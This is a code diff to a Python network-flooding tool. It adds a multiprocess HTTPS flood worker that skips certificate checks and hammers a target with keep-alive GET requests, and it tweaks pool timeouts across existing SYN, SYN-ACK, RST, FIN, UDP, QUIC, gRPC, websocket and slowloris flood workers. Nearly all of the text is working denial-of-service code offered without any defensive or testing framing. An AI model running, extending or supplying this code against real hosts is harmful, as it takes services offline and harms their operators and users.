@@ -189,6 +189,66 @@ async def http_worker(name, url, stats, duration, stop, payload_size=0):
     if writer.transport:
         writer.transport.abort()
 
+def _mp_https_flood(args_tuple):
+    """Multi-process HTTPS flooder: TLS + HTTP in a child process."""
+    import time as _time
+    import ssl as _ssl
+    import socket as _socket
+    host, port, path, duration = args_tuple
+    sent = 0
+    errors = 0
+    try:
+        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        raw.settimeout(5.0)
+        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+        raw.connect((host, port))
+        ssock = ctx.wrap_socket(raw, server_hostname=host)
+        
+        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+               f"Connection: keep-alive\r\n"
+               f"User-Agent: dossal/3.16\r\n\r\n").encode()
+        
+        end = _time.time() + duration
+        while _time.time() < end:
+            try:
+                ssock.sendall(req)
+                # Read one response (header + body)
+                data = ssock.recv(65535)
+                if not data:
+                    break
+                sent += 1
+            except Exception:
+                break
+        try:
+            ssock.close()
+        except Exception:
+            pass
+    except Exception:
+        errors += 1
+    return sent, errors
+
+async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
+    """HTTPS multiprocess worker."""
+    host, port, path = parse_http(url)
+    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, path, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_https_flood, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [(0, 0)] * n_procs
+    for sent, errs in results:
+        stats.requests += sent
+        stats.errors += errs
+    stats.conns += n_procs
+
 async def https_worker(name, url, stats, duration, stop, payload_size=0):
     host, port, path = parse_http(url)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -288,7 +348,7 @@ async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_tcp_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0, 0)] * n_procs
     stats.conns += n_procs
@@ -331,7 +391,7 @@ async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
     async_result = pool.map_async(_mp_udp_send, targets)
     
     # Wait for completion
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [0] * n_procs
     total = sum(results) if isinstance(results, list) else results
@@ -476,7 +536,7 @@ async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_grpc_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     for sent, errs in results:
@@ -586,7 +646,7 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_quic_send, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [0] * n_procs
     total = sum(results) if isinstance(results, list) else results
@@ -626,15 +686,17 @@ def _mp_http_send(args_tuple):
 async def _wait_pool(pool, async_result, timeout):
     """Wait for a multiprocessing pool result using a dedicated executor."""
     loop = asyncio.get_event_loop()
-    executor = asyncio.get_event_loop().create_task  # placeholder
     import concurrent.futures
     with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ded:
         try:
             results = await loop.run_in_executor(ded, async_result.get, timeout)
         except Exception:
             results = None
-    pool.terminate()
-    pool.join()
+    pool.close()
+    try:
+        await loop.run_in_executor(None, pool.join)
+    except Exception:
+        pass
     return results
 
 async def raw_worker(name, url, stats, duration, stop, payload_size=0):
@@ -648,7 +710,7 @@ async def raw_worker(name, url, stats, duration, stop, payload_size=0):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_http_send, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     
@@ -723,7 +785,7 @@ async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_ws_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     
@@ -761,7 +823,7 @@ async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_syn_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     for conns, errs in results:
@@ -798,7 +860,7 @@ async def synack_worker(name, url, stats, duration, stop, payload_size=0):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_synack_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     for conns, errs in results:
@@ -843,7 +905,7 @@ async def rst_worker(name, url, stats, duration, stop, payload_size=1):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_rst_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     for conns, errs in results:
@@ -886,7 +948,7 @@ async def fin_worker(name, url, stats, duration, stop, payload_size=0):
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_fin_flood, targets)
     
-    results = await _wait_pool(pool, async_result, duration + 5)
+    results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
         results = [(0, 0)] * n_procs
     for conns, errs in results:
@@ -925,6 +987,7 @@ async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
 WORKERS = {
     "http":      http_worker,
     "https":     https_worker,
+    "httpsmp":   https_mp_worker,
     "ws":        ws_worker,
     "websocket": ws_worker,
     "tcp":       tcp_worker,
